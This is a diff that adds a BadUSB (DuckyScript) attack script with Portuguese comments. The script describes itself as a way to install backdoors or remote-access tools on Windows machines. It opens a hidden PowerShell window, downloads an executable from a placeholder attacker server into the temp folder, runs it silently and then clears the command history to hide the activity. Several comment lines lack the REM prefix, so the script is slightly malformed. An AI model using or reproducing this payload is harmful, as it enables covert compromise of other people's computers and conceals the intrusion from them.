@@ -1,0 +1,36 @@
+REM =================================================================
+REM Ataque BadUSB - Download e Execução de Payload
+REM =================================================================
+REM
+REM Descrição: Script BadUSB que baixa e executa um payload remoto
+REM diretamente na máquina alvo.
+REM
+ Quando usar: Para instalar backdoors ou ferramentas de acesso remoto
+REM em sistemas Windows.
+REM
+ Como usar: Conectar o dispositivo BadUSB e o script será executado
+REM automaticamente.
+REM
+ Observações: Requer conexão com internet. Modifique a URL do payload
+REM conforme necessário.
+REM
+=================================================================
+
+REM Abre o PowerShell em modo oculto
+GUI r
+DELAY 500
+STRINGLN powershell -WindowStyle Hidden
+ENTER
+DELAY 1000
+
+REM Baixa e executa o payload remoto
+STRINGLN $url = "https://seu-servidor.com/payload.exe"; $output = "$env:TEMP\payload.exe"; Invoke-WebRequest -Uri $url -OutFile $output; Start-Process $output -ArgumentList "-silent"
+ENTER
+
+REM Limpa o histórico de comandos
+STRINGLN Clear-History
+ENTER
+
+Fecha o PowerShell
+STRINGLN exit
+ENTER
